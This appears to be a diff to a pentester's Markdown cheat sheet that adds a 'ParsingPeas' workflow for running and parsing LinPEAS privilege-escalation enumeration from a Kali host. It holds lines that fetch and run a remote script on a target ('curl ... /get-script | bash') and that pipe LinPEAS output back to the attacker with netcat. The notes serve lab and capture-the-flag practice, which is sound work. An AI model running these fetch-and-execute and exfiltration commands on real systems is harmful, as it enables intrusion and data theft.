@@ -17,6 +17,25 @@ stty raw -echo; fg; export TERM=xterm
 /usr/share/peass/linpeas/linpeas.sh
 ```
 
+## ParsingPeas workflow (preferred)
+Primary parser/workflow: https://github.com/YuvalMil/ParsingPeas
+
+On Kali:
+```bash
+git clone https://github.com/YuvalMil/ParsingPeas
+cd ParsingPeas
+./setup.sh
+pip3 install -r requirements.txt
+python3 receiver.py
+```
+
+On target:
+```bash
+curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
+```
+
+This keeps the LinPEAS execution, upload, and HTML report generation in one workflow from your Kali host.
+
 ## LinPEAS from memory (Kali Host)
 https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#quick-start
 ```
@@ -26,6 +45,11 @@ nc -lvnp 9002 | tee linpeas.out
 ## LinPEAS from memory (victim)
 ```
 curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
+```
+
+## Parse saved LinPEAS output
+```bash
+python3 parser.py /path/to/linpeas.out
 ```
 
 
